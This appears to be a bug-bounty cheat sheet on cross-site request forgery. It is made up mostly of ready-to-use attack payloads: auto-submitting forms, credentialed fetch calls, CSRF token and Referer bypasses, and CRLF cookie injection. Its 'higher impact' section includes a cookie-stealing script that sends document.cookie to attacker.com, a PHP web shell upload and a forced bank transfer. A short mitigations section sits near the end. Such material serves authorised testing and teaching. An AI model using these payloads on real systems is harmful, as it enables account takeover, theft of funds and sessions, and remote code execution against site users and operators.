## 📖 Overview

**Cross-Site Request Forgery (CSRF)** is a web vulnerability that forces authenticated users to execute unwanted actions on a web application. The attacker tricks the victim's browser into making requests on their behalf, using their existing session cookies.

### 🔑 Key Conditions for CSRF

1. **A valuable action exists** (password change, email update, fund transfer, privilege escalation)
2. **Cookie-based session handling** (app relies solely on cookies for authentication)
3. **No unpredictable parameters** (no CSRF tokens or hard-to-guess values)

### 💡 How It Works

When a logged-in user visits a malicious site, that site triggers requests to the victim application. The browser automatically includes session cookies, making the request appear legitimate.

---

## 🔍 Where to Find CSRF

- **Forms** without CSRF tokens
- **State-changing requests** (POST, PUT, DELETE)
- **JSON endpoints** that accept cookies
- **Hidden paths/parameters** (often unprotected)
- **Mobile endpoints** using cookie auth
- **Login/Logout functionality**
- **Password reset flows**
- **Profile/settings updates**
- **Financial transactions**
- **Admin actions**

---

## ⚡ Quick Testing Steps

### 🎯 Basic Flow

1. **Intercept the request** in Burp Suite
2. **Right-click** → _Engagement tools_ → _Generate CSRF PoC_
3. **Remove the CSRF token** (if present)
4. **Test the HTML** in a browser where you're logged in
5. **Verify** if the action executes successfully

### 🔥 Fast Checks

```markdown
✅ Remove CSRF token completely
✅ Send empty token value (token=)
✅ Change POST → GET
✅ Use another user's valid token
✅ Remove Referer header
✅ Change single character in token
✅ Replace with same-length random value
✅ Try method override (_method=PUT)
```

---

## 🛠️ Exploitation Methods

### 1️⃣ **HTML GET Method**

```html
<a href="http://target.com/api/setusername?username=hacked">Click Me</a>

<!-- Auto-trigger with image -->
<img src="http://target.com/email/change?email=pwned@evil.com" style="display:none">
```

### 2️⃣ **HTML POST Method (Auto-Submit)**

```html
<html>
  <body>
    <form action="http://target.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 3️⃣ **POST via Hidden Iframe (No Page Reload)**

```html
<html>
  <body>
    <iframe style="display:none" name="csrf_frame"></iframe>
    <form method="POST" action="http://target.com/change-email" target="csrf_frame">
      <input type="hidden" name="email" value="pwned@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 4️⃣ **JSON POST Request (XMLHttpRequest)**

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":"admin"}');
</script>
```

### 5️⃣ **Multipart/Form-Data Request**

```html
<html>
<body>
<script>
function submitRequest() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://target.com/api/users", true);
  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------149631704917378");
  xhr.withCredentials = true;
  var body = "-----------------------------149631704917378\r\n" + 
    "Content-Disposition: form-data; name=\"username\"\r\n\r\n" + 
    "admin\r\n" + 
    "-----------------------------149631704917378--\r\n";
  xhr.send(new Blob([new Uint8Array(body.split('').map(c => c.charCodeAt(0)))]));
}
submitRequest();
</script>
</body>
</html>
```

### 6️⃣ **Fetch API (Modern)**

```html
<script>
fetch('http://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({role: 'admin'})
});
</script>
```

### 7️⃣ **Socket.IO CSRF**

```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io("http://target.com:50022/test");
socket.on("connect", () => {
  socket.emit("join", {room: "admin"});
  socket.emit("my_room_event", {data: "!flag", room: "admin"});
});
</script>
```

---

## 🚀 CSRF Token Bypass Techniques

### ✂️ **1. Remove Token Completely**

```http
❌ POST /change-email HTTP/1.1
   csrf=abc123&email=victim@test.com

✅ POST /change-email HTTP/1.1
   email=attacker@evil.com
```

### 📭 **2. Send Empty Token Value**

```http
POST /change-email HTTP/1.1

csrf=&email=attacker@evil.com
```

### 🔄 **3. Change Request Method (POST → GET)**

Many apps only validate CSRF on POST:

```http
❌ POST /change-email HTTP/1.1
   csrf=token123&email=new@test.com

✅ GET /change-email?email=pwned@evil.com HTTP/1.1
```

**HTML Payload:**

```html
<img src="http://target.com/change-email?email=pwned@evil.com">
```

### 🎭 **4. Use Another User's Valid Token**

1. Login with your account
2. Get your CSRF token
3. Use it in victim's request

```http
POST /change-email HTTP/1.1

csrf=YOUR_VALID_TOKEN&email=attacker@evil.com
```

### 🔓 **5. Token Not Tied to Session**

If tokens aren't bound to user sessions:

```html
<html>
  <body>
    <form method="POST" action="http://target.com/change-email">
      <input type="hidden" name="email" value="pwned@evil.com" />
      <input type="hidden" name="csrf" value="ATTACKER_TOKEN_FROM_DROPPED_REQUEST" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 🔄 **6. Change Single Character in Token**

```http
❌ csrf=aaaaaaaaaaaaaaaaaaaaaa
✅ csrf=aaaaaaaaaaaaaaaaaaaaab
```

### 📏 **7. Replace with Same-Length Value**

```http
❌ csrf=aaaaaa
✅ csrf=bbbbbb
```

### 🔐 **8. Decrypt/Decode Token**

Check if token is base64 or simple encoding:

```http
csrf=MTIzNDU2  →  base64 decode  →  123456
```

### 🍪 **9. CSRF Token Duplicated in Cookie**

If token is both in cookie AND parameter with same value:

```http
POST /change-email HTTP/1.1
Cookie: csrf=fake_token
Content-Type: application/x-www-form-urlencoded

csrf=fake_token&email=pwned@evil.com
```

**Exploit using CRLF injection:**

```html
<html>
  <body>
    <form method="POST" action="http://target.com/change-email">
      <input type="hidden" name="csrf" value="fake_token" />
      <input type="hidden" name="email" value="pwned@evil.com" />
    </form>
    <img src="http://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake_token" 
         onerror="document.forms[0].submit();" />
  </body>
</html>
```

### 🎯 **10. Static Token Parts**

Sometimes tokens have static + dynamic parts:

```http
Token 1: vi802jg9f8akd9j123
Token 2: vi802jg9f8akd9j124
         ^^^^^^^^^^^^^^^  ← static part
```

Send only the static part:

```http
csrf=vi802jg9f8akd9j
```

### 🔄 **11. Method Override Bypass**

```http
POST /users/delete HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&_method=DELETE
```

Headers that work:

- `X-HTTP-Method`
- `X-HTTP-Method-Override`
- `X-Method-Override`

### 🚫 **12. Remove Referer Header**

Add this meta tag:

```html
<meta name="referrer" content="no-referrer">
```

### 🌐 **13. Bypass Referer Validation**

If site checks for `bank.com` in referer:

```
✅ bank.com.attacker.com
✅ attacker.com/bank.com
✅ attacker.com?bank.com
```

**JavaScript trick:**

```html
<script>
history.pushState("", "", "/?target.com");
document.forms[0].submit();
</script>
```

### 📝 **14. Content-Type Change**

Switch content-type to avoid preflight:

```http
❌ Content-Type: application/json
✅ Content-Type: text/plain
✅ Content-Type: application/x-www-form-urlencoded
✅ Content-Type: multipart/form-data
```

**JSON as text/plain:**

```html
<form method="POST" action="http://target.com/api" enctype="text/plain">
  <input name='{"email":"' value='pwned@evil.com", "role":"admin"}' />
</form>
```

### 🧪 **15. Null Token Value**

```http
csrf=null&email=pwned@evil.com
```

---

## 🎨 Top 10 Modern Payloads

### 1. **Basic Auto-Submit Form**

```html
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### 2. **Image-Based GET Trigger**

```html
<img src="https://target.com/delete-account?confirm=yes" style="display:none">
```

### 3. **Fetch API with Credentials**

```html
<script>
fetch('https://target.com/api/promote', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({userId: 123, role: 'admin'})
});
</script>
```

### 4. **Method Override (POST→DELETE)**

```html
<form method="POST" action="https://target.com/user/delete">
  <input name="userId" value="999">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>
```

### 5. **JSON via text/plain**

```html
<form method="POST" action="https://target.com/api/update" enctype="text/plain">
  <input name='{"email":"' value='pwned@evil.com","role":"admin"}'>
</form>
<script>document.forms[0].submit();</script>
```

### 6. **Referer Bypass with History API**

```html
<html>
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<form method="POST" action="https://target.com/transfer">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
history.pushState("", "", "/?target.com");
document.forms[0].submit();
</script>
</body>
</html>
```

### 7. **Hidden Iframe (No Navigation)**

```html
<iframe style="display:none" name="hidden"></iframe>
<form method="POST" action="https://target.com/api/update" target="hidden">
  <input type="hidden" name="username" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

### 8. **Cookie Injection + CSRF**

```html
<html>
<body>
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="pwned@evil.com">
  <input type="hidden" name="csrf" value="fake_token">
</form>
<img src="https://target.com/?search=x%0d%0aSet-Cookie:%20csrf=fake_token" 
     onerror="document.forms[0].submit();">
</body>
</html>
```

### 9. **Token Theft via XSS → CSRF**

```html
<script>
fetch('https://target.com/profile')
  .then(r => r.text())
  .then(html => {
    let token = html.match(/name="csrf" value="(.+?)"/)[1];
    fetch('https://target.com/change-password', {
      method: 'POST',
      credentials: 'include',
      body: 'csrf=' + token + '&password=pwned123'
    });
  });
</script>
```

### 10. **Multipart with File Upload**

```javascript
<script>
var formData = new FormData();
formData.append('email', 'pwned@evil.com');
formData.append('file', new Blob(['<?php system($_GET["c"]); ?>'], {type: 'text/php'}), 'shell.php');
fetch('https://target.com/profile/update', {
  method: 'POST',
  credentials: 'include',
  body: formData
});
</script>
```

---

## 💥 Higher Impact Scenarios

### 🔗 **1. CSRF + Stored XSS Chain**

```html
<!-- CSRF that injects XSS payload into profile -->
<form method="POST" action="https://target.com/profile/update">
  <input name="bio" value='<script>fetch("https://attacker.com?c="+document.cookie)</script>'>
</form>
<script>document.forms[0].submit();</script>
```

### 🔓 **2. Login CSRF → Account Takeover**

Force victim to login to attacker's account, then steal data:

```html
<form method="POST" action="https://target.com/login">
  <input type="hidden" name="username" value="attacker@evil.com">
  <input type="hidden" name="password" value="KnownPass123">
</form>
<script>
document.forms[0].submit();
setTimeout(() => location = 'https://target.com/settings', 2000);
</script>
```

### 💰 **3. Financial Transaction**

```html
<form method="POST" action="https://bank.com/transfer">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### 👑 **4. Privilege Escalation**

```html
<script>
fetch('https://target.com/admin/promote', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({userId: 999, role: 'superadmin'})
});
</script>
```

### 🔐 **5. Password Reset Token Hijack**

```html
<form method="POST" action="https://target.com/reset-password">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### 📧 **6. Email Change → Account Takeover**

```html
<img src="https://target.com/change-email?email=attacker@evil.com&confirm=yes">
```

Then trigger password reset on attacker's email.

---

## 🛡️ Defense Bypass Techniques

### 🔍 **SameSite Cookie Bypass**

- **SameSite=Lax**: Still allows GET requests from top-level navigation
- **Bypass**: Use GET-based CSRF or convert POST to GET

```html
<a href="https://target.com/delete?id=123">Click for free prize!</a>
```

### 🎭 **Double Submit Cookie Bypass**

When token is in both cookie and parameter:

1. Find CRLF injection
2. Set both cookie and parameter to same value

```html
<img src="https://target.com/?x=%0d%0aSet-Cookie:%20csrf=fake">
<form method="POST" action="https://target.com/action">
  <input name="csrf" value="fake">
</form>
```

### 🔄 **Origin/Referer Check Bypass**

- Use `<meta name="referrer" content="no-referrer">`
- Inject target domain in URL: `attacker.com?target.com`
- Use `history.pushState()` to manipulate URL

---

## 🔨 Testing Tools

```bash
# XSRFProbe - Advanced CSRF scanner
pip3 install xsrfprobe
xsrfprobe -u https://target.com

# Burp Suite - Generate CSRF PoC
Right-click request → Engagement Tools → Generate CSRF PoC

# Manual testing with curl
curl -X POST https://target.com/action \
  -H "Cookie: session=abc123" \
  -d "email=pwned@evil.com"
```

---

## 🛡️ Proper Mitigations

### ✅ **Effective Defenses**

1. **Anti-CSRF Tokens**
    
    - Unique per session
    - Unpredictable (cryptographically random)
    - Validated on every state-changing request
2. **SameSite Cookies**
    
    ```http
    Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
    ```
    
3. **Custom Headers**
    
    ```javascript
    xhr.setRequestHeader('X-CSRF-Token', 'token_value');
    ```
    
4. **Double Submit Cookie Pattern**
    
    - Token in cookie AND request body
    - Both must match
5. **User Interaction**
    
    - CAPTCHA
    - Password re-confirmation
    - OTP codes
6. **Origin/Referer Validation**
    
    - Check both headers
    - Fail closed if missing

### ❌ **Ineffective Mitigations**

- Using POST instead of GET (can be bypassed)
- Secret cookies without validation
- URL rewriting
- Only checking Referer (can be removed)
- Checking only if token exists (not its value)

---

## 📚 Pro Tips

🎯 **Always test state-changing actions**  
🔍 **Check mobile/API endpoints** (often less protected)  
🔄 **Try method overrides** (`_method`, `X-HTTP-Method-Override`)  
📧 **Chain with XSS/CRLF** for higher impact  
🍪 **Test SameSite cookie behavior**  
⚡ **Automate with Burp Scanner** for initial triage  
🧪 **Test with different content types**  
🔐 **Look for clickjacking + CSRF** combos  
📱 **Check if GET methods work** for POST actions

---

## 🎓 Quick Reference Checklist

```markdown
☐ Remove CSRF token
☐ Empty token value
☐ Change POST → GET
☐ Use your own token
☐ Change one character
☐ Same-length random value
☐ Remove Referer header
☐ Bypass Referer with URL tricks
☐ Method override (_method)
☐ Content-Type switch
☐ Cookie injection (CRLF)
☐ Test with different users
☐ Check HEAD method
☐ Try null token
☐ Decode/decrypt token
☐ Static parts only
☐ clickjacking combo
```

---

**🚀 You're ready to crush CSRF bugs! Go get those bounties!** 🎉